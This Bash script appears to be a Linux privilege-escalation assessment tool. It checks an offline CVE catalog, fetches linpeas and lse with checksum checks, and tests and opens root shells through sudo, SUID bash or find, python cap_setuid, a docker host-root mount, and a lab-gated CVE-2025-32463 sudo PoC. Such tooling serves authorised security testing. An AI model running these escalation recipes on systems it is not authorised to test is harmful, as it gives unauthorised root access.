#!/usr/bin/env bash
# Edamame-NG: host-local Linux enumeration and verified privilege proof.
set -uo pipefail
umask 077

if [[ $(uname -s) != Linux ]]; then
  printf 'Edamame-NG Linux runner requires Linux.\n' >&2
  exit 2
fi

RUN_BASE="${HOME}/edamame-ng-runs"
CACHE_BASE="${XDG_CACHE_HOME:-${HOME}/.cache}/edamame-ng"
TOOL_DIR=''
MODE='auto'
RESUME_ID=''
NO_SHELL=0
VERBOSE=0
OFFLINE=0
FINISH_BG_ENUM=0
CATALOG_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)/catalog"
CVE_QUERY=''
QUERY_MODES=0
POC_QUERY=0
CVE_DETAILS_QUERY=0
DETAILS_CATALOG_STATE=''
ALL_DETAILS_STATE=''
ALL_DETAILS_ROOT=''
LAB_CVE_ENABLED=0
CVE_SUDO='/opt/edamame-vuln-sudo/bin/sudo'
CVE_SUDO_SHA='8c18093b760250d35b1ebcc5ecd12b33d17b8a2cfc27f170bbb4f62b674702cd'
CVE_POC_SHA='9826979c7a3cb1ca582862768d74245806051db5601c7b6a7e13bde93b8052d7'

usage() {
  cat <<'EOF'
Usage: edamame-ng.sh [--scan | --resume [RUN_ID]] [--output-dir DIR]
                      [--tool-dir DIR] [--catalog-dir DIR] [--offline]
                      [--finish-bg-enum] [--verbose] [--no-shell]
                      [--enable-cve-2025-32463-lab]
       edamame-ng.sh --cve CVE-YYYY-NNNN [--catalog-dir DIR]
       edamame-ng.sh --cve-details CVE-YYYY-NNNN [--catalog-dir DIR]
       edamame-ng.sh --poc CVE-YYYY-NNNN [--catalog-dir DIR]
Run with no mode to choose Resume (default) or Scan when a prior success exists.
--tool-dir accepts local assets only when each has an adjacent .sha256 file.
EOF
}

while (($#)); do
  case $1 in
    --scan) MODE=scan; shift ;;
    --resume) MODE=resume; shift; if (($#)) && [[ $1 != --* ]]; then RESUME_ID=$1; shift; fi ;;
    --output-dir) (($# >= 2)) || { usage >&2; exit 2; }; RUN_BASE=$2; shift 2 ;;
    --tool-dir) (($# >= 2)) || { usage >&2; exit 2; }; TOOL_DIR=$2; shift 2 ;;
    --catalog-dir) (($# >= 2)) || { usage >&2; exit 2; }; CATALOG_DIR=$2; shift 2 ;;
    --cve) (($# >= 2)) || { usage >&2; exit 2; }; CVE_QUERY=$2; QUERY_MODES=$((QUERY_MODES+1)); shift 2 ;;
    --cve-details) (($# >= 2)) || { usage >&2; exit 2; }; CVE_QUERY=$2; CVE_DETAILS_QUERY=1; QUERY_MODES=$((QUERY_MODES+1)); shift 2 ;;
    --poc) (($# >= 2)) || { usage >&2; exit 2; }; CVE_QUERY=$2; POC_QUERY=1; QUERY_MODES=$((QUERY_MODES+1)); shift 2 ;;
    --enable-cve-2025-32463-lab) LAB_CVE_ENABLED=1; shift ;;
    --no-shell) NO_SHELL=1; shift ;;
    --offline) OFFLINE=1; shift ;;
    --finish-bg-enum) FINISH_BG_ENUM=1; shift ;;
    -v|--verbose) VERBOSE=1; shift ;;
    -h|--help) usage; exit 0 ;;
    *) usage >&2; exit 2 ;;
  esac
done
if ((QUERY_MODES > 1)); then
  printf 'Choose one CVE query mode.\n' >&2
  exit 2
fi
CVE_POC="$CATALOG_DIR/pocs/CVE-2025-32463/sudo-chwoot.sh"
CVE_BASE="$CATALOG_DIR/local-eop.tsv"
[[ -f $CVE_BASE ]] || CVE_BASE=/dev/null
CVE_CURATED="$CATALOG_DIR/curated-eop.tsv"
[[ -f $CVE_CURATED ]] || CVE_CURATED=/dev/null

cve_lookup() {
  local id=$1 platform=$2 row state year
  row=$(awk -F '\t' -v id="$id" -v platform="$platform" 'FNR>1 && $1==id {
    status=($2==platform || platform=="any" ? "indexed-review-only" : "platform-mismatch")
    print $1 "\t" status "\t" $2 "\t" $3 "\t" $4 "\t" $5; exit}' \
    "$CVE_BASE" "$CVE_CURATED")
  if [[ -n $row ]]; then
    printf '%s\n' "$row"
    return
  fi
  year=${id:4:4}
  state=''
  if [[ -f $CATALOG_DIR/cve-ids/$year.tsv ]]; then
    state=$(awk -F '\t' -v id="$id" 'FNR>1 && $1==id {print $2; exit}' "$CATALOG_DIR/cve-ids/$year.tsv")
  fi
  [[ -n $state ]] && state="${state}-general" || state=unindexed
  printf '%s\t%s\t\t\t\thttps://www.cve.org/CVERecord?id=%s\n' "$id" "$state" "$id"
}

cve_details_lookup() {
  local id=$1 row state year review_state=details-not-installed member
  member=''
  member=$(awk -F '\t' -v id="$id" 'FNR>1 && $1==id {print 1; exit}' "$CVE_BASE" "$CVE_CURATED")
  if [[ -n $member ]] && verify_details_catalog; then
    row=$(awk -F '\t' -v id="$id" 'FNR>1 && $1==id {print; exit}' "$CATALOG_DIR/local-eop-details.tsv")
    if [[ -n $row ]]; then printf '%s\t\n' "$row"; return; fi
  fi
  if [[ $DETAILS_CATALOG_STATE == invalid ]]; then review_state=integrity-failed; fi
  year=${id:4:4}
  state=''
  if [[ -f $CATALOG_DIR/cve-ids/$year.tsv ]]; then
    state=$(awk -F '\t' -v id="$id" 'FNR>1 && $1==id {print $2; exit}' "$CATALOG_DIR/cve-ids/$year.tsv")
  fi
  [[ -n $state ]] || state=unindexed
  printf '%s\t%s\t\t\t\t%s\t\n' "$id" "$state" "$review_state"
  [[ $review_state != integrity-failed ]]
}

sha256_file() {
  local binary line digest
  for binary in /usr/bin/sha256sum /bin/sha256sum; do
    if [[ -x $binary ]]; then
      line=$("$binary" "$1") || return 1
      digest=${line%% *}
      [[ $digest =~ ^[0-9a-fA-F]{64}$ ]] || return 1
      printf '%s\n' "$digest"
      return 0
    fi
  done
  for binary in /usr/bin/shasum /bin/shasum; do
    if [[ -x $binary ]]; then
      line=$("$binary" -a 256 "$1") || return 1
      digest=${line%% *}
      [[ $digest =~ ^[0-9a-fA-F]{64}$ ]] || return 1
      printf '%s\n' "$digest"
      return 0
    fi
  done
  return 1
}

verify_details_catalog() {
  local index=$CATALOG_DIR/local-eop-details.tsv manifest=$CATALOG_DIR/local-eop-details-source.json
  local base=$CATALOG_DIR/cve-ids-source.json expected actual baseline index_baseline
  [[ $DETAILS_CATALOG_STATE == valid ]] && return 0
  [[ $DETAILS_CATALOG_STATE == invalid ]] && return 1
  [[ -f $index ]] || { DETAILS_CATALOG_STATE=absent; return 1; }
  DETAILS_CATALOG_STATE=invalid
  [[ ! -L $index && -f $manifest && ! -L $manifest && -f $base && ! -L $base ]] || return 1
  expected=$(sed -nE 's/^[[:space:]]*"details_sha256":[[:space:]]*"([0-9a-f]{64})",?[[:space:]]*$/\1/p' "$manifest")
  baseline=$(sed -nE 's/^[[:space:]]*"baseline_sha256":[[:space:]]*"([0-9a-f]{64})",?[[:space:]]*$/\1/p' "$manifest")
  index_baseline=$(sed -nE 's/^[[:space:]]*"baseline_sha256":[[:space:]]*"([0-9a-f]{64})",?[[:space:]]*$/\1/p' "$base")
  [[ $expected =~ ^[0-9a-f]{64}$ && $baseline =~ ^[0-9a-f]{64}$ && $baseline == "$index_baseline" ]] || return 1
  actual=$(sha256_file "$index") || return 1
  [[ $actual == "$expected" ]] || return 1
  DETAILS_CATALOG_STATE=valid
}

cve_detail_status() {
  local id=$1 review=$2 state=''
  if [[ -f $CATALOG_DIR/cve-ids/${id:4:4}.tsv ]]; then
    state=$(awk -F '\t' -v id="$id" 'NR>1 && $1==id {print $2; exit}' "$CATALOG_DIR/cve-ids/${id:4:4}.tsv")
  fi
  printf '%s\t%s\t\t\t\t%s\t\n' "$id" "${state:-unindexed}" "$review"
}

# These small manifests are read only when details are requested. An installed
# marker binds the source JSON, which binds the immutable generation manifest.
verify_all_details_catalog() {
  local marker=$CATALOG_DIR/all-cve-details/installed source=$CATALOG_DIR/all-cve-details-source.json
  local base=$CATALOG_DIR/cve-ids-source.json expected generation baseline index_baseline index_hash base_hash count shard_count
  [[ $ALL_DETAILS_STATE == valid ]] && return 0
  [[ $ALL_DETAILS_STATE == invalid ]] && return 1
  [[ -e $marker || -L $marker ]] || { ALL_DETAILS_STATE=absent; return 1; }
  ALL_DETAILS_STATE=invalid
  [[ -f $marker && ! -L $marker && -f $source && ! -L $source && -f $base && ! -L $base ]] || return 1
  [[ ! -L $CATALOG_DIR/all-cve-details ]] || return 1
  [[ $(wc -c < "$marker") -eq 65 && $(wc -c < "$source") -lt 65536 && $(wc -c < "$base") -lt 65536 ]] || return 1
  IFS= read -r expected < "$marker"
  [[ $expected =~ ^[0-9a-f]{64}$ && $(sha256_file "$source") == "$expected" ]] || return 1
  generation=$(sed -nE 's/^[[:space:]]*"shards_sha256":[[:space:]]*"([0-9a-f]{64})",?[[:space:]]*$/\1/p' "$source")
  baseline=$(sed -nE 's/^[[:space:]]*"baseline_sha256":[[:space:]]*"([0-9a-f]{64})",?[[:space:]]*$/\1/p' "$source")
  index_baseline=$(sed -nE 's/^[[:space:]]*"baseline_sha256":[[:space:]]*"([0-9a-f]{64})",?[[:space:]]*$/\1/p' "$base")
  index_hash=$(sed -nE 's/^[[:space:]]*"index_sha256":[[:space:]]*"([0-9a-f]{64})",?[[:space:]]*$/\1/p' "$source")
  base_hash=$(sed -nE 's/^[[:space:]]*"index_sha256":[[:space:]]*"([0-9a-f]{64})",?[[:space:]]*$/\1/p' "$base")
  count=$(sed -nE 's/^[[:space:]]*"record_count":[[:space:]]*([0-9]+),?[[:space:]]*$/\1/p' "$source")
  shard_count=$(sed -nE 's/^[[:space:]]*"shard_count":[[:space:]]*([0-9]+),?[[:space:]]*$/\1/p' "$source")
  [[ $shard_count =~ ^[0-9]{1,9}$ ]] || return 1
  [[ $generation =~ ^[0-9a-f]{64}$ && $baseline =~ ^[0-9a-f]{64}$ && $index_hash =~ ^[0-9a-f]{64}$ && $count =~ ^[0-9]{1,9}$ ]] || return 1
  [[ $baseline == "$index_baseline" && $index_hash == "$base_hash" ]] || return 1
  grep -qE '^[[:space:]]*"format_version":[[:space:]]*1,?$' "$source" || return 1
  ALL_DETAILS_ROOT=$CATALOG_DIR/all-cve-details/$generation
  [[ -d $ALL_DETAILS_ROOT && ! -L $ALL_DETAILS_ROOT && -f $ALL_DETAILS_ROOT/shards.tsv && ! -L $ALL_DETAILS_ROOT/shards.tsv ]] || return 1
  [[ $(wc -c < "$ALL_DETAILS_ROOT/shards.tsv") -le 16777216 && $(sha256_file "$ALL_DETAILS_ROOT/shards.tsv") == "$generation" ]] || return 1
  LC_ALL=C awk -F '\t' -v total="$count" -v shards="$shard_count" '
    NR==1 {if ($0!="path\tsha256\trows\tbytes\tuncompressed_bytes") bad=1; next}
    {split($1,p,"/"); split(p[2],s,".");
     if (NF!=5 || length(p[1])!=4 || p[1]!~/^[0-9]+$/ || length(s[1])<1 || length(s[1])>16 ||
         s[1]!~/^[0-9]+$/ || $1!=p[1] "/" s[1] ".tsv.gz" || seen[$1]++ ||
         length($2)!=64 || $2!~/^[0-9a-f]+$/ || $3!~/^[0-9]+$/ || $3<1 || $3>1000 ||
         $4!~/^[0-9]+$/ || $4<1 || $4>269484032 || $5!~/^[0-9]+$/ || $5<1 || $5>268435456) bad=1;
     n+=$3}
    END {if (bad || n!=total || NR-1!=shards) exit 1}' "$ALL_DETAILS_ROOT/shards.tsv" || return 1
  ALL_DETAILS_STATE=valid
}

# Input is a list of exact IDs. Each requested shard is hashed/decompressed once
# per batch. Candidate output stays in a private temporary file until the whole
# touched shard passes gzip, size, row-count, route and duplicate checks.
cve_details_batch() {
  local temporary id suffix key previous='' failed=0 entry digest count bytes expanded asset actual
  temporary=$(mktemp -d "${TMPDIR:-/tmp}/edamame-details.XXXXXXXX") || return 1
  : > "$temporary/requests"
  while IFS= read -r id; do
    [[ -n $id ]] || continue
    if [[ ! $id =~ ^CVE-[0-9]{4}-[0-9]{4,19}$ ]]; then failed=1; continue; fi
    suffix=${id:9}
    printf '%s/%s.tsv.gz\t%s\n' "${id:4:4}" "${suffix:0:${#suffix}-3}" "$id" >> "$temporary/requests"
  done
  if [[ ! -s $temporary/requests ]]; then rm -rf -- "$temporary"; return "$failed"; fi
  verify_all_details_catalog || true
  if [[ $ALL_DETAILS_STATE == absent ]]; then
    if [[ -f $CATALOG_DIR/local-eop-details.tsv ]]; then verify_details_catalog || true; fi
    while IFS=$'\t' read -r key id; do cve_details_lookup "$id" || failed=1; done < "$temporary/requests"
  elif [[ $ALL_DETAILS_STATE == invalid ]]; then
    while IFS=$'\t' read -r key id; do
      cve_detail_status "$id" integrity-failed
    done < "$temporary/requests"
    failed=1
  else
    LC_ALL=C sort -u "$temporary/requests" > "$temporary/sorted"
    while IFS=$'\t' read -r key id; do
      [[ $key != "$previous" ]] || continue
      previous=$key
      awk -F '\t' -v key="$key" '$1==key {print $2}' "$temporary/sorted" > "$temporary/ids"
      entry=$(awk -F '\t' -v key="$key" 'NR>1 && $1==key {print; exit}' "$ALL_DETAILS_ROOT/shards.tsv")
      if [[ -z $entry ]]; then
        # No shard is normal only when every requested ID is absent from the
        # dated ID index. An indexed ID without its declared data fails closed.
        while IFS= read -r id; do
          actual=$(awk -F '\t' -v id="$id" '$1==id {print $2; exit}' "$CATALOG_DIR/cve-ids/${id:4:4}.tsv" 2>/dev/null)
          if [[ -n $actual ]]; then
            printf '%s\t%s\t\t\t\tintegrity-failed\t\n' "$id" "$actual"; failed=1
          else printf '%s\tunindexed\t\t\t\tnot-in-dated-baseline\t\n' "$id"; fi
        done < "$temporary/ids"
        continue
      fi
      IFS=$'\t' read -r key digest count bytes expanded <<< "$entry"
      asset=$ALL_DETAILS_ROOT/$key
      if [[ -f $asset && ! -L $asset && ! -L ${asset%/*} && $(wc -c < "$asset") -eq $bytes && $(sha256_file "$asset") == "$digest" ]] &&
        gzip -dc -- "$asset" | head -c "$((expanded+1))" | fold -b -w 16777216 | LC_ALL=C awk -F '\t' -v key="$key" -v rows="$count" -v size="$expanded" '
          FILENAME!="-" {wanted[$1]=1; next}
          FNR==1 {if ($0!="cve\tstate\tdescription\taffected_json\treferences_json\treview_state\tsource_json") bad=1; bytes=length($0)+1; next}
          {bytes+=length($0)+1; count++; split($1,p,"-"); suffix=p[3];
           if (NF!=7 || length($0)+1>16777216 || count>1000 || bytes>size || p[1]!="CVE" ||
               length(p[2])!=4 || p[2]!~/^[0-9]+$/ || length(suffix)<4 || length(suffix)>19 || suffix!~/^[0-9]+$/ ||
               p[2] "/" substr(suffix,1,length(suffix)-3) ".tsv.gz"!=key || seen[$1]++ ||
               $2!~/^(published|rejected|reserved)$/ || $6!="source-metadata-unreviewed" || $0~/[^\t -~]/) {bad=1; exit 1}
           if ($1 in wanted) {print; found[$1]=1}}
          END {if (bad || count!=rows || bytes!=size) exit 1}' "$temporary/ids" - > "$temporary/matches"; then
        cat "$temporary/matches"
        while IFS= read -r id; do
          if ! awk -F '\t' -v id="$id" '$1==id {found=1} END {exit !found}' "$temporary/matches"; then
            actual=$(awk -F '\t' -v id="$id" '$1==id {print $2; exit}' "$CATALOG_DIR/cve-ids/${id:4:4}.tsv" 2>/dev/null)
            if [[ -n $actual ]]; then
              printf '%s\t%s\t\t\t\tintegrity-failed\t\n' "$id" "$actual"; failed=1
            else printf '%s\tunindexed\t\t\t\tnot-in-dated-baseline\t\n' "$id"; fi
          fi
        done < "$temporary/ids"
      else
        while IFS= read -r id; do cve_detail_status "$id" integrity-failed; done < "$temporary/ids"
        failed=1
      fi
    done < "$temporary/sorted"
  fi
  rm -rf -- "$temporary"
  return "$failed"
}

trusted_root_file() {
  local path=$1 mode
  [[ $path == /* && -f $path ]] || return 1
  while [[ $path != / ]]; do
    [[ ! -L $path && $(/usr/bin/stat -c %u "$path" 2>/dev/null) == 0 ]] || return 1
    mode=$(/usr/bin/stat -c %a "$path" 2>/dev/null) || return 1
    [[ $mode =~ ^[0-7]+$ ]] || return 1
    (( (8#$mode & 8#22) == 0 )) || return 1
    path=${path%/*}
    [[ -n $path ]] || path=/
  done
}

if [[ -n $CVE_QUERY ]]; then
  [[ $CVE_QUERY =~ ^CVE-[0-9]{4}-[0-9]{4,19}$ ]] || { printf 'Invalid CVE ID.\n' >&2; exit 2; }
  if ((POC_QUERY)); then
    [[ -f $CATALOG_DIR/poc_refs.tsv ]] || { printf 'Offline PoC manifest unavailable.\n' >&2; exit 2; }
    printf 'cve\tstatus\tsource\tpath\tsha256\treview_state\n'
    poc_found=0
    while IFS=$'\t' read -r id _kind source _commit relative digest _license state; do
      [[ $id == "$CVE_QUERY" ]] || continue
      poc_found=1
      if [[ $relative == - ]]; then
        printf '%s\treference-only\t%s\t\t\t%s\n' "$id" "$source" "$state"
        continue
      fi
      [[ $relative =~ ^pocs/CVE-[0-9]{4}-[0-9]{4,}/[A-Za-z0-9._-]+$ && $relative == "pocs/$CVE_QUERY/"* && $digest =~ ^[0-9a-f]{64}$ ]] || { printf 'Invalid PoC manifest entry.\n' >&2; exit 2; }
      asset="$CATALOG_DIR/$relative"
      [[ -f $asset && ! -L $asset && $(sha256_file "$asset") == "$digest" ]] || { printf 'PoC asset missing or digest mismatch.\n' >&2; exit 2; }
      printf '%s\tverified-bundle\t%s\t%s\t%s\t%s\n' "$id" "$source" "$asset" "$digest" "$state"
    done < <(tail -n +2 "$CATALOG_DIR/poc_refs.tsv")
    ((poc_found)) || printf '%s\tnot-indexed\t\t\t\t\n' "$CVE_QUERY"
  elif ((CVE_DETAILS_QUERY)); then
    printf 'cve\tstate\tdescription\taffected_json\treferences_json\treview_state\tsource_json\n'
    if ! cve_details_batch <<< "$CVE_QUERY"; then
      printf 'Offline CVE details failed integrity checks.\n' >&2
      exit 2
    fi
  else
    [[ $CVE_BASE != /dev/null || $CVE_CURATED != /dev/null || -d $CATALOG_DIR/cve-ids ]] || { printf 'Offline catalog unavailable.\n' >&2; exit 2; }
    printf 'cve\tstatus\tplatform\tproduct\tkev_date\treference\n'
    cve_lookup "$CVE_QUERY" any
  fi
  exit 0
fi

cat <<'EOF'
   _____    _                                   _   _  _____
  | ____|__| | __ _ _ __ ___   __ _ _ __ ___   | \ | |/ ____|
  |  _| / _` |/ _` | '_ ` _ \ / _` | '_ ` _ \  |  \| | |  __
  | |__| (_| | (_| | | | | | | (_| | | | | | | | |\  | |__| |
  |_____\__,_|\__,_|_| |_| |_|\__,_|_| |_| |_| |_| \_|\_____|
                      Edamame-NG  /  Linux
EOF

safe_name() { [[ $1 =~ ^[A-Za-z0-9._+-]+$ && $1 != . && $1 != .. ]]; }
host_name=$(hostname -s 2>/dev/null || hostname)
host_name=${host_name//[^A-Za-z0-9._-]/_}

if [[ -L $RUN_BASE || -L $CACHE_BASE ]]; then
  printf 'Run and cache directories must not be symbolic links.\n' >&2
  exit 2
fi

latest_success() {
  [[ -d $RUN_BASE ]] || return 1
  find "$RUN_BASE" -mindepth 2 -maxdepth 2 -name success.tsv -type f -print 2>/dev/null |
    sort -r | while IFS= read -r candidate; do
      IFS=$'\t' read -r candidate_host _ < "$candidate"
      if [[ $candidate_host == "$host_name" ]]; then
        printf '%s\n' "$candidate"
        break
      fi
    done
}

if [[ $MODE == auto ]]; then
  prior=$(latest_success || true)
  if [[ -n $prior ]]; then
    if [[ -t 0 ]]; then
      read -r -p "Prior success found. [R]esume (default) or [S]can? " choice
      [[ $choice == [sS]* ]] && MODE=scan || MODE=resume
    else
      MODE=resume
    fi
  else
    MODE=scan
  fi
fi

if ((VERBOSE)) && [[ $MODE == scan ]]; then
  printf '[WARN] Verbose displays raw enumerator output, including possible credentials, on this console.\n' >&2
fi

success_file=''
if [[ $MODE == resume ]]; then
  if [[ -n $RESUME_ID ]]; then
    safe_name "$RESUME_ID" || { printf 'Invalid run ID.\n' >&2; exit 2; }
    success_file="$RUN_BASE/$RESUME_ID/success.tsv"
  else
    success_file=$(latest_success || true)
  fi
  [[ -n $success_file && -f $success_file && ! -L $success_file && ! -L ${success_file%/success.tsv} ]] || {
    printf 'No valid successful run to resume.\n' >&2; exit 2;
  }
  IFS=$'\t' read -r saved_host recipe _ < "$success_file"
  [[ $saved_host == "$host_name" ]] || { printf 'Saved run belongs to another host.\n' >&2; exit 2; }
  case $recipe in
    already-root|sudo-shell|suid-bash|suid-find|python-cap-setuid|docker-host-root|cve-2025-32463-lab) ;;
    *) printf 'Unknown saved recipe.\n' >&2; exit 2 ;;
  esac
  if [[ $recipe == cve-2025-32463-lab ]] && (( ! LAB_CVE_ENABLED )); then
    printf 'Saved CVE recipe requires --enable-cve-2025-32463-lab.\n' >&2
    exit 2
  fi
  printf '[RESUME] %s on %s; checking prerequisites again.\n' "$recipe" "$host_name"
  RUN_DIR=${success_file%/success.tsv}
else
  mkdir -p "$RUN_BASE" "$CACHE_BASE" || exit 2
  chmod 700 "$RUN_BASE" "$CACHE_BASE" || exit 2
  run_id="$(date -u +%Y%m%dT%H%M%SZ)-${host_name}-$$"
  RUN_DIR="$RUN_BASE/$run_id"
  mkdir -m 700 "$RUN_DIR" "$RUN_DIR/.capture" || exit 2
  : > "$RUN_DIR/tools.tsv"
  : > "$RUN_DIR/findings.tsv"
  : > "$RUN_DIR/attempts.tsv"
  : > "$RUN_DIR/coverage.tsv"
  printf '[RUN] %s\n' "$RUN_DIR"
fi

record_attempt() {
  printf '%s\t%s\t%s\n' "$(date -u +%Y-%m-%dT%H:%M:%SZ)" "$1" "$2" >> "$RUN_DIR/attempts.tsv"
}

record_finding() {
  local category=$1 detail=$2
  printf '%s\t%s\n' "$category" "$detail" >> "$RUN_DIR/findings.tsv"
  printf '[FOUND] %s: %s\n' "$category" "$detail"
}

asset_from_release() {
  local repo=$1 asset=$2 dest=$3 tag expected url html actual cache_dir cached
  cache_dir="$CACHE_BASE/${repo//\//_}"
  mkdir -p "$cache_dir"
  chmod 700 "$cache_dir"
  cached="$cache_dir/$asset"
  if [[ -n $TOOL_DIR ]]; then
    if [[ -f $TOOL_DIR/$asset && -f $TOOL_DIR/$asset.sha256 ]]; then
      expected=$(awk 'NR==1 {print $1}' "$TOOL_DIR/$asset.sha256" | tr '[:upper:]' '[:lower:]')
      actual=$(sha256_file "$TOOL_DIR/$asset")
      if [[ $expected =~ ^[a-f0-9]{64}$ && $actual == "$expected" ]]; then
        cp "$TOOL_DIR/$asset" "$dest"
        printf '%s\tlocal\t%s\t%s\n' "$asset" "$TOOL_DIR/$asset" "$actual" >> "$RUN_DIR/tools.tsv"
        return 0
      fi
    fi
    printf '[WARN] Local %s is missing or its checksum failed.\n' "$asset" >&2
  elif (( ! OFFLINE )); then
    url=$(curl -fsSLI --connect-timeout 5 --max-time 20 -o /dev/null -w '%{url_effective}' "https://github.com/$repo/releases/latest" 2>/dev/null || true)
    tag=${url##*/}
    if safe_name "$tag" && [[ $url == "https://github.com/$repo/releases/tag/"* ]]; then
      html="$RUN_DIR/.capture/${asset}.release.html"
      if curl -fsSL --connect-timeout 5 --max-time 25 "https://github.com/$repo/releases/expanded_assets/$tag" -o "$html" 2>/dev/null; then
        expected=$(awk -v n="$asset" 'index($0,"digest for " n "\"") {if (match($0,/sha256:[a-f0-9]{64}/)) {print substr($0,RSTART+7,64); exit}}' "$html")
        if [[ -z $expected && $repo == diego-treitos/linux-smart-enumeration && $asset == lse.sh ]]; then
          url="https://github.com/$repo/releases/download/$tag/$asset"
          if curl -fsSL --retry 2 --connect-timeout 5 --max-time 180 "$url" -o "$dest" 2>/dev/null; then
            actual=$(sha256_file "$dest")
            cp "$dest" "$cached"
            printf '%s\n' "$actual" > "$cached.sha256"
            printf '%s\t%s\t%s\t%s\t%s\n' "$asset" "$tag" "$url" "$actual" legacy-release-no-published-digest >> "$RUN_DIR/tools.tsv"
            printf '[WARN] %s release publishes no SHA-256; recorded download digest for cache checks.\n' "$asset" >&2
            return 0
          fi
        fi
        if [[ $expected =~ ^[a-f0-9]{64}$ ]]; then
          url="https://github.com/$repo/releases/download/$tag/$asset"
          if curl -fsSL --retry 2 --connect-timeout 5 --max-time 180 "$url" -o "$dest" 2>/dev/null; then
            actual=$(sha256_file "$dest")
            if [[ $actual == "$expected" ]]; then
              cp "$dest" "$cached"
              printf '%s\n' "$expected" > "$cached.sha256"
              printf '%s\t%s\t%s\t%s\n' "$asset" "$tag" "$url" "$actual" >> "$RUN_DIR/tools.tsv"
              return 0
            fi
            rm -f "$dest"
            printf '[WARN] %s digest mismatch.\n' "$asset" >&2
          fi
        fi
      fi
    fi
    printf '[WARN] Current %s unavailable; checking verified cache.\n' "$asset" >&2
  else
    printf '[OFFLINE] Checking verified cache for %s.\n' "$asset"
  fi
  if [[ -f $cached && -f $cached.sha256 ]]; then
    expected=$(awk 'NR==1 {print $1}' "$cached.sha256" | tr '[:upper:]' '[:lower:]')
    actual=$(sha256_file "$cached")
    if [[ $expected =~ ^[a-f0-9]{64}$ && $actual == "$expected" ]]; then
      cp "$cached" "$dest"
      printf '%s\tcache\t%s\t%s\n' "$asset" "$cached" "$actual" >> "$RUN_DIR/tools.tsv"
      return 0
    fi
  fi
  printf '%s\tmissing\t-\t-\n' "$asset" >> "$RUN_DIR/tools.tsv"
  return 1
}

verify_recipe() {
  local recipe=$1 py caps image probe version cve_dir finder
  case $recipe in
    already-root) [[ $EUID == 0 ]] ;;
    sudo-shell) command -v sudo >/dev/null 2>&1 && sudo -n /bin/bash -i -c 'test "$EUID" = 0' >/dev/null 2>&1 ;;
    suid-bash)
      [[ -u /bin/bash && $(stat -Lc %u /bin/bash 2>/dev/null) == 0 ]] &&
        /bin/bash -p -c 'test "$EUID" = 0' >/dev/null 2>&1
      ;;
    suid-find)
      for finder in /usr/bin/find /bin/find; do
        [[ -x $finder && -u $finder && $(stat -Lc %u "$finder" 2>/dev/null) == 0 ]] || continue
        probe=$("$finder" /dev/null -exec /bin/bash -p -c 'printf "uid=%s\n" "$EUID"' \; 2>/dev/null) || continue
        if [[ $probe == uid=0 ]]; then SUID_FIND_PATH=$finder; return 0; fi
      done
      return 1
      ;;
    python-cap-setuid)
      py=$(command -v python3 || true)
      [[ -n $py ]] && command -v getcap >/dev/null 2>&1 || return 1
      caps=$(getcap "$py" 2>/dev/null)
      [[ $caps == *cap_setuid* ]] && "$py" -c 'import os; os.setuid(0); assert os.getuid()==0' >/dev/null 2>&1
      ;;
    docker-host-root)
      command -v docker >/dev/null 2>&1 || return 1
      image=$(docker image ls --format '{{.Repository}}:{{.Tag}}' 2>/dev/null | awk '$0 !~ /<none>/ {print; exit}')
      [[ -n $image ]] || return 1
      timeout 30 docker run --rm --pull never --network none --entrypoint /bin/sh -v /:/host:ro "$image" -c 'chroot /host /bin/sh -c "test \"\$(id -u)\" = 0"' >/dev/null 2>&1
      ;;
    cve-2025-32463-lab)
      ((LAB_CVE_ENABLED)) || return 1
      [[ -x /usr/bin/stat && -x /usr/bin/timeout && -x /usr/bin/gcc ]] || return 1
      cve_dir=${CVE_SUDO%/*}
      trusted_root_file "$CVE_SUDO" && [[ -u $CVE_SUDO ]] || return 1
      trusted_root_file "$CVE_POC" || return 1
      [[ $(sha256_file "$CVE_SUDO") == "$CVE_SUDO_SHA" ]] || return 1
      version=$("$CVE_SUDO" -V 2>/dev/null) || return 1
      [[ ${version%%$'\n'*} == 'Sudo version 1.9.16p2' ]] || return 1
      [[ $(sha256_file "$CVE_POC") == "$CVE_POC_SHA" ]] || return 1
      probe=$(PATH="$cve_dir:/usr/sbin:/usr/bin:/sbin:/bin" /usr/bin/timeout 30 /bin/bash "$CVE_POC" --probe 2>&1) || return 1
      printf '%s\n' "$probe" | /usr/bin/grep -qx '0'
      ;;
    *) return 1 ;;
  esac
}

open_shell() {
  local recipe=$1 image py
  if ((NO_SHELL)); then
    printf '[PROOF] %s verified. Shell suppressed by --no-shell.\n' "$recipe"
    return 0
  fi
  [[ -t 0 && -t 1 ]] || { printf '[WARN] Interactive TTY required for elevated shell. Resume from a terminal.\n' >&2; return 0; }
  printf '[SHELL] %s. Exit to return to Edamame-NG.\n' "$recipe"
  case $recipe in
    already-root) /bin/bash -i ;;
    sudo-shell) sudo -n /bin/bash -i ;;
    suid-bash) /bin/bash -p -i ;;
    suid-find) "$SUID_FIND_PATH" /dev/null -exec /bin/bash -p -i \; ;;
    python-cap-setuid)
      py=$(command -v python3)
      "$py" -c 'import os; os.setuid(0); os.execv("/bin/bash",["/bin/bash","-i"])'
      ;;
    docker-host-root)
      image=$(docker image ls --format '{{.Repository}}:{{.Tag}}' 2>/dev/null | awk '$0 !~ /<none>/ {print; exit}')
      docker run --rm -it --pull never --network none --entrypoint /bin/sh -v /:/host:rw "$image" -c 'chroot /host /bin/bash -i'
      ;;
    cve-2025-32463-lab)
      PATH="${CVE_SUDO%/*}:/usr/sbin:/usr/bin:/sbin:/bin" /bin/bash "$CVE_POC" --shell
      ;;
  esac
}

if [[ $MODE == resume ]]; then
  if verify_recipe "$recipe"; then
    record_attempt "$recipe" resumed-proof
    open_shell "$recipe"
    exit 0
  fi
  record_attempt "$recipe" resume-prerequisite-failed
  printf '[WARN] Saved recipe no longer works. Use --scan.\n' >&2
  exit 1
fi

if [[ -n $TOOL_DIR ]]; then
  printf '[ENUM] Loading verified local assets.\n'
elif ((OFFLINE)); then
  printf '[OFFLINE] Using verified cached assets; release downloads are disabled.\n'
else
  printf '[ENUM] Fetching official current release assets.\n'
fi
linpeas="$RUN_DIR/.capture/linpeas.sh"
lse="$RUN_DIR/.capture/lse.sh"
have_linpeas=0; have_lse=0
linpeas_complete=0; lse_complete=0
asset_from_release peass-ng/PEASS-ng linpeas.sh "$linpeas" && have_linpeas=1
asset_from_release diego-treitos/linux-smart-enumeration lse.sh "$lse" && have_lse=1

# Keep a group leader alive until cleanup, even when timeout or the tool exits.
# Bash job control supplies the same isolation on hosts without setsid.
enum_labels=(linpeas lse)
enum_pids=('' '')
enum_identities=('' '')
enum_authorized=(0 0)
enum_statuses=(unavailable unavailable)
